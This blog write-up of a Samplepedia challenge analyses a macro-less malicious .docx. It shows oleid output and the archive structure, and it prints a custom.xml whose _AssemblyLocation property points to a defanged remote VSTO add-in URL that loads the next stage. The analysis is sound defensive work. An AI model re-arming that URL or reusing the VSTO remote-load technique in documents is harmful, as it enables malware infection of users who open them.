---
title: Samplepedia - Malicious .docx Analysis Writeup
date: 2026-01-24
categories:
  - malware
  - reversing
  - writeups
tags:
  - samplepedia
  - msoffice
---
#### Intro
This is an easy-tagged challenge on [samplepedia](https://samplepedia.cc) , focusing on analysing a malicious .docx file and identifying from where the next stage of the infection is loaded. Even though it is an easy challenge, it can still be considered interesting since it "breaks the norm" by not containing any malicious macros - as most similar initial infections utilizing MS Office tools do. 

Challenge URL: <https://samplepedia.cc/sample/56f5623daa470bee190ae0ecd961be8e6df71c8da1ccf7b268fe876b84c1>
#### Goal
Where does this file load the next stage from?

#### Analysis
Checking the file with oleid from [oletools](https://github.com/decalage2/oletools) shows that there are no embedded macros.
```
Indicator id=ftype name="File format" | value='MS Word 2007+ Document (.docx)'
description:

Indicator id=container name="Container format" | value='OpenXML'
description: Container type

Indicator id=encrypted name="Encrypted" | value=False
description: The file is not encrypted

Indicator id=vba name="VBA Macros" | value='No'
description: This file does not contain VBA macros.

Indicator id=xlm name="XLM Macros" | value='No'
description: This file does not contain Excel 4/XLM macros.

Indicator id=ext_rels name="External Relationships" | value=0
description: External relationships such as remote templates, remote OLE objects, etc

Indicator id=ObjectPool name="ObjectPool" | value=False
description: Contains an ObjectPool stream, very likely to contain embedded OLE objects or files. Use oleobj to check it.

Indicator id=flash name="Flash objects" | value=0
description: Number of embedded Flash objects (SWF files) detected in OLE streams. Not 100% accurate, there may be false positives.
```

Since .docx files are archives , by extracting it with 7zip we get the following directory structure:

```
56f5623daa470bee190ae0ecd961be8e6df71c8da1ccf7b268fe876b84c183d9~
│   [Content_Types].xml
│   
├───customXml
│   │   item1.xml
│   │   itemProps1.xml
│   │   
│   └───_rels
│           item1.xml.rels
│           
├───docProps
│       app.xml
│       core.xml
│       custom.xml
│       
├───vstoDataStore
│   │   item2.xml
│   │   itemProps2.xml
│   │   
│   └───_rels
│           item2.xml.rels
│           
├───word
│   │   document.xml
│   │   fontTable.xml
│   │   settings.xml
│   │   styles.xml
│   │   webSettings.xml
│   │   
│   ├───media
│   │       image1.png
│   │       
│   ├───theme
│   │       theme1.xml
│   │       
│   └───_rels
│           document.xml.rels
│           
└───_rels
        .rels
        
```

Two things stand-out , the *vstoDataStore* directory and the *custom.xml* file. Both indicate the usage of VSTO by the .docx. 

By examining the contents of *custom.xml* we get the following:

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
	<property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" name="_AssemblyLocation" pid="2">
		<vt:lpwstr>hxxps://login03k[.]com/update/Trusted Updater.vsto|a8ed4033-4074-4eb7-9c6a-93bbb8a3776c</vt:lpwstr>
	</property>
	<property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" name="_AssemblyName" pid="3">
		<vt:lpwstr>4E3C66D5-58D4-491E-A7D4-64AF99AF6E8B</vt:lpwstr>
	</property>
</Properties>
```

We see that *_AssemblyLocation* property contains the URL:  
```
hxxps://login03k[.]com/update/Trusted Updater.vsto
```
which appears to contain the next stage of the infection. This also aligns with the fact that, based on the fetched extension, the .docx tries to fetch a VSTO file , which it then tries to execute (based on the existence of both *custom.xml* and *vstoDataStore* ). Please note that both instances of the URL above were defanged.

Unfortunately, this is our best guess for the next stage, since the aforementioned URL appears to be down.

#### Helpful Resources
* <https://www.deepinstinct.com/blog/no-macro-no-worries-vsto-being-weaponized-by-threat-actors>
* <https://blog.nviso.eu/2022/04/29/analyzing-vsto-office-files/>
